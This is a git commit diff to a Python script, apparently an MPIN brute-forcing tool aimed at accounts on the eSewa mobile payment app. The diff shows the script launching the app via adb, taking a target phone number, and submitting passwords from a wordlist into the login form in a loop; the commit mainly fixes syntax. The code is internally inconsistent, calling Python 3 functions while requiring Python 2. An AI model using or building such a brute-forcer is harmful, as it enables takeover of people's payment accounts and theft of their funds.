74aae8422d57ab8d50d938745575507b5b742b1c
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-04 17:28:57 +0545

    Update fp2.py

--- fp2.py
+++ fp2.py
@@ -1,5 +1,6 @@
 import time
 import sys
+import subprocess
 
 if sys.version_info[0] != 2:
     print('''--------------------------------------
@@ -9,27 +10,27 @@ if sys.version_info[0] != 2:
         ''')
     sys.exit()
 
-import subprocess
+package_name = "com.f1soft.esewa"
+subprocess.run(["adb", "shell", "am", "start", "-n", package_name + "/.MainActivity"])
 
-package_name = "com.f1 soft.esewa"
-subprocess.run(["adb", "shell", "am", "start", "-n", com.f1 soft.esewa + "/.MainActivity"])
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
 try:
     import mechanize
-    browser = mechanize.Browser()
-    browser.addheaders = [('User-Agent', headers['User-Agent'])]
-    browser.set_handle_robots(False)
 except ImportError:
     print('\nPlease install mechanize.\n')
     sys.exit()
 
+browser = mechanize.Browser()
+browser.addheaders = [('User-Agent', headers['User-Agent'])]
+browser.set_handle_robots(False)
+
 print('\n----------Welcome|VICKY----------\n')
 file = open('passwords.txt', 'r')
 
-MobileNumber = str(raw_input('Mobile Number : ').strip())
+MobileNumber = raw_input('Mobile Number : ').strip()  # Use input() instead of raw_input() in Python 3
 
 print("\nTarget Mobile Number : ", MobileNumber)
 print("\nTrying Passwords from list ...")
@@ -46,7 +47,7 @@ while True:
         if response.code == 200:
             browser.select_form(nr=0)
             browser.form['Mobile Number'] = MobileNumber
-            browser.form['MPIN'] = passw 
+            browser.form['MPIN'] = passw
             response = browser.submit()
             response_data = response.read()
             print(response_data.decode('utf-8'))
